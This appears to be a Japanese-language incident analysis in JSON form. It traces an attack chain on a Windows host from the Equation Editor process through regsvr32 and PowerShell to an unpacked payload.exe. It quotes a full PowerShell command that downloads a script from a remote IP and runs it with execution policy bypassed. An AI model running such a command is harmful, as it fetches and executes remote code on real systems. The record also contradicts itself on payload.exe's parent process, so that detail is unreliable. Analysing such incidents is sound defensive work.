official_messages.content:
{
  "summary": "2022年7月19日14時36分台に、ホストWIN-32-H1上でpowershell.exeがregsvr32.exeを親プロセスとして起動されました。powershell.exeのコマンドラインにはIPアドレス直指定のURL（http://10.193.66.115:8080/sF5riGj4K26DK）が含まれており、このURLに対してDNSリクエストは発生していませんが、powershell.exeはリモートIP 10.193.66.115のポート8080および8443にネットワーク接続を行っています。regsvr32.exeはeqnedt32.exe（親はsvchost.exe）から起動されており、powershell.exeは多数のシステムファイルを読み取っています。powershell.exeは子プロセスとしてcmd.exeを生成し、さらにcmd.exeはpayload.exeを子プロセスとして起動しています。payload.exeは一時ディレクトリに多数の.dllや.pyd、zipファイルなどを展開し、python関連のライブラリファイルを操作していますが、payload.exeの親プロセス情報はログに記録されていません。cmd.exeおよびpayload.exeはネットワーク接続や子プロセス生成のログはなく、ファイル操作に集中しています。",
  "code_sequence": [
    "regsvr32.exeがeqnedt32.exeから起動",
    "regsvr32.exeがpowershell.exeを起動",
    "powershell.exeがURL http://10.193.66.115:8080/sF5riGj4K26DK にアクセス",
    "powershell.exeがcmd.exeを子プロセスとして生成",
    "cmd.exeがpayload.exeを子プロセスとして生成",
    "payload.exeがC:\\Users\\aalsahee\\AppData\\Local\\Temp\\_MEI32082\\配下に多数のファイルを展開"
  ],
  "code_steps": [
    {
      "subject": "eqnedt32.exe",
      "operation": "launch",
      "object": "regsvr32.exe",
      "evidence": {
        "timestamp": "2022-07-19 14:33:24",
        "host": "WIN-32-H1"
      }
    },
    {
      "subject": "regsvr32.exe",
      "operation": "launch",
      "object": "powershell.exe",
      "command_line": "powershell.exe -Command Invoke-WebRequest http://10.193.66.115:8080/sF5riGj4K26DK -OutFile script.ps1; powershell -ExecutionPolicy Bypass -File script.ps1",
      "evidence": {
        "timestamp": "2022-07-19 14:36:16",
        "host": "WIN-32-H1"
      }
    },
    {
      "subject": "powershell.exe",
      "operation": "connect",
      "object": "10.193.66.115:8080",
      "evidence": {
        "timestamp": "2022-07-19 14:36:16",
        "host": "WIN-32-H1"
      }
    },
    {
      "subject": "powershell.exe",
      "operation": "spawn",
      "object": "cmd.exe",
      "evidence": {
        "timestamp": "2022-07-19 14:37:00",
        "host": "WIN-32-H1"
      }
    },
    {
      "subject": "cmd.exe",
      "operation": "spawn",
      "object": "payload.exe",
      "evidence": {
        "timestamp": "2022-07-19 14:37:30",
        "host": "WIN-32-H1"
      }
    },
    {
      "subject": "payload.exe",
      "operation": "write",
      "object": "C:\\Users\\aalsahee\\AppData\\Local\\Temp\\_MEI32082\\*.dll, *.pyd, *.zip",
      "evidence": {
        "timestamp_range": "2022-07-19 14:37:30 - 14:40:00",
        "host": "WIN-32-H1"
      }
    }
  ],
  "unresolved_frontier": [
    "payload.exeの親プロセス情報（起動経路の未確認エッジ）",
    "cmd.exeおよびpayload.exeのネットワーク接続および子プロセス生成の詳細",
    "payload.exeの作成ファイルの実態（内容解析や実行可能性の検証）"
  ]
}

